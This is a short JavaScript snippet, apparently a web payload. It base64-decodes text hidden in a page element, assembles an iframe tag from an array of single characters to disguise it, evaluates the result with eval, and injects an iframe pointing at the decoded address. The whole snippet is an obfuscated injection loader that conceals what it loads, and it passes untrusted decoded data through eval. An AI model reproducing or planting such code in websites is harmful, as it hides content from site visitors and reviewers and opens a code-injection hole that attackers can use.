var elem = document.getElementById('evalInject')
var dcoded = atob(document.getElementById('heheh').innerHTML)
var makeFun =   ["`", "<", "i", "f", "r", "a", "m", "e", " ", "i", "d", "=", "'", "t", "h", "e", "I", "f", "r", "a", "m", "e", "E", "v", "a", "l", "e", "d", "'", " ", "s", "r", "c", "=", "'", "$", "{", "d", "c", "o", "d", "e", "d", "}", "'", ">", "<", "/", "i", "f", "r", "a", "m", "e", ">", "`"]
elem.innerHTML = eval(makeFun.join(''))

